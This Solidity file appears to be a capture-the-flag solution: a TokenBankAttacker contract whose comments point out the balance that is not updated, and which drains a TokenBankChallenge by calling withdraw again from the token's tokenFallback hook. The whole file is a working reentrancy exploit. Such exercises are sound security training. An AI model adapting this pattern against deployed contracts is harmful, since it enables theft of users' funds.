pragma solidity ^0.7.3;
import "hardhat/console.sol";

abstract contract ISimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 value)
        external
        virtual
        returns (bool success);
}

abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function isComplete() external view virtual returns (bool);

    function withdraw(uint256 amount) external virtual;
}

contract TokenBankAttacker {
    ITokenBankChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ITokenBankChallenge(challengeAddress);
    }

    function deposit() external payable {
        uint256 myBalance = challenge.token().balanceOf(address(this));
        // deposit is handled in challenge's tokenFallback
        challenge.token().transfer(address(challenge), myBalance);
    }

    function attack() external payable {
        callWithdraw();
        // if something went wrong, revert
        require(challenge.isComplete(), "challenge not completed");
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes calldata
    ) external {
        require(
            msg.sender == address(challenge.token()),
            "not from original token"
        );

        // when attacker EOA deposits, ignore
        if (from != address(challenge)) return;

        callWithdraw();
    }

    function callWithdraw() private {
        // this one is the bugged one, does not update after withdraw
        uint256 myInitialBalance = challenge.balanceOf(address(this));
        // this one from the token contract, updates after withdraw
        uint256 challengeTotalRemainingBalance =
            challenge.token().balanceOf(address(challenge));
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;
        console.log("myInitialBalance is %s tokens", myInitialBalance);
        console.log(
            "challengeTotalRemainingBalance is %s tokens",
            challengeTotalRemainingBalance
        );

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                myInitialBalance < challengeTotalRemainingBalance
                    ? myInitialBalance
                    : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}
